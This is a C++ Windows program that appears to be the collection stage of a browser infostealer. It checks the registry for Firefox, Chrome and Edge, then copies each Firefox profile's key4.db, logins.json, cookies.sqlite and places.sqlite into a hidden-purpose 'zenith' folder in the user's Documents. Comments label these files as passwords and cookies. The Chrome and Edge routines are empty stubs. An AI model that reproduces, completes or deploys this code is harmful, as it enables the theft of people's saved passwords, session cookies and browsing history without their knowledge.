#include <iostream>
#include <cstddef>
#include <stdio.h>
#include <tchar.h>
#include <string>
#include <vector>
#include <algorithm>
#include <regex>
#include <windows.h>
#include <shlobj.h>
#include <filesystem>

// #pragma comment(lib, "shell32.lib")

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

namespace fs = std::filesystem;

bool verify_browser_installation(const LPCWSTR p_name);
void collect_firefox_data(std::string p_path_to_extraction_directory);
void collect_chrome_data(std::string p_path_to_extraction_directory);
void collect_edge_data(std::string p_path_to_extraction_directory);

// Helper functions
wchar_t* convert_to_wchar(const char* charArray);
std::string create_extraction_directory();
std::string get_local_appdata_path();

int main(int argc, char** argv) {
	std::string path_to_extraction_directory = create_extraction_directory();

	// Firefox
	if (verify_browser_installation(L"Software\\Mozilla\\Firefox"))
	{	
		collect_firefox_data(path_to_extraction_directory);
	}

	// Chrome
	if (verify_browser_installation(L"Software\\Google\\Chrome"))
	{
		collect_chrome_data(path_to_extraction_directory);
	}

	// Edge
	if (verify_browser_installation(L"Software\\Microsoft\\Edge"))
	{
		collect_edge_data(path_to_extraction_directory);
	}

	return 0;
}

bool verify_browser_installation(const LPCWSTR p_name) {
	HKEY hKey = 0;
	::RegOpenKeyEx(
		HKEY_CURRENT_USER,
		p_name,
		0,
		KEY_READ,
		&hKey
	);

	TCHAR    achKey[MAX_KEY_LENGTH];			// buffer for subkey name
	DWORD    cbName = 0;						// size of name string 
	TCHAR    achClass[MAX_PATH] = TEXT("");		// buffer for class name 
	DWORD    cchClassName = MAX_PATH;			// size of class string 
	DWORD    cSubKeys = 0;						// number of subkeys 
	DWORD    cbMaxSubKey = 0;					// longest subkey size 
	DWORD    cchMaxClass = 0;					// longest class string 
	DWORD    cValues = 0;						// number of values for key 
	DWORD    cchMaxValue = 0;					// longest value name 
	DWORD    cbMaxValueData = 0;				// longest value data 
	DWORD    cbSecurityDescriptor = 0;			// size of security descriptor 
	FILETIME ftLastWriteTime;					// last write time 

	DWORD i = 0, j = 0, retCode = 0;

	TCHAR  achValue[MAX_VALUE_NAME] = { '\0' };
	DWORD cchValue = MAX_VALUE_NAME;

	// Get the class name and the value count. 
	retCode = ::RegQueryInfoKey(
		hKey,						// key handle 
		achClass,					// buffer for class name 
		&cchClassName,				// size of class string 
		NULL,						// reserved 
		&cSubKeys,					// number of subkeys 
		&cbMaxSubKey,				// longest subkey size 
		&cchMaxClass,				// longest class string 
		&cValues,					// number of values for this key 
		&cchMaxValue,				// longest value name 
		&cbMaxValueData,			// longest value data 
		&cbSecurityDescriptor,		// security descriptor 
		&ftLastWriteTime			// last write time
	);

	if (cSubKeys)
	{
		return true;
	}
	return false;
}

void collect_firefox_data(std::string p_path_to_extraction_directory) {
	std::string path_to_appdata = get_local_appdata_path();
	if (p_path_to_extraction_directory != "" && path_to_appdata != "") {
		std::string path_to_profiles = path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
		std::vector<std::regex> regex_list = {
			std::regex("(.*?)(places\\.sqlite)$"),	// Contains bookmarks, names of downloaded files, and websites visted
			std::regex("(.*?)(key4\\.db)$"),			// Passwords
			std::regex("(.*?)(logins\\.json)$"),		// Passwords
			std::regex("(.*?)(cookies\\.sqlite)$"),	// Stored cookies
		};
		std::regex profile_regex("(.*?)([a-zA-Z0-9]{8,8}\\.(.*?))$");
		std::smatch sm;
		std::string profile_path_as_string;
		std::string profile_name;
		std::string desired_file_path_as_string;
		std::string desired_file_name;

		for (const auto& profile_path : fs::directory_iterator(path_to_profiles)) {
			profile_path_as_string = profile_path.path().string();
			std::regex_match(profile_path_as_string.cbegin(), profile_path_as_string.cend(), sm, profile_regex);
			profile_name = sm[3];
			
			for (const auto& file_path : fs::directory_iterator(profile_path.path().string())) {
				desired_file_path_as_string = file_path.path().string();
				for (std::regex i : regex_list) {
					if (std::regex_match(desired_file_path_as_string.cbegin(), desired_file_path_as_string.cend(), sm, i)) {
						desired_file_name = sm[2];
						desired_file_name = profile_name + "_" + desired_file_name;

						CopyFile(
							convert_to_wchar(desired_file_path_as_string.c_str()), 
							convert_to_wchar((p_path_to_extraction_directory + "\\" + desired_file_name).c_str()),
							1
						);
					}
				}
			}
		}
	}
}

void collect_chrome_data(std::string p_path_to_extraction_directory) {

}

void collect_edge_data(std::string p_path_to_extraction_directory) {

}

std::string create_extraction_directory() {
	wchar_t Folder[1024];
	HRESULT hr = SHGetFolderPathW(0, CSIDL_MYDOCUMENTS, 0, 0, Folder);
	if (SUCCEEDED(hr))
	{
		char path[1024];
		wcstombs(path, Folder, 1023);
		std::strcat(path, "\\zenith");
		CreateDirectory(convert_to_wchar(path), NULL);
		return path;
	}
	return "";
}

wchar_t* convert_to_wchar(const char* charArray)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;
}

std::string get_local_appdata_path() {
	wchar_t Folder[1024];
	HRESULT hr = SHGetFolderPathW(0, CSIDL_APPDATA, 0, 0, Folder);
	if (SUCCEEDED(hr)) {
		char path[1024];
		wcstombs(path, Folder, 1023);
		return path;
	}
	return "";
}
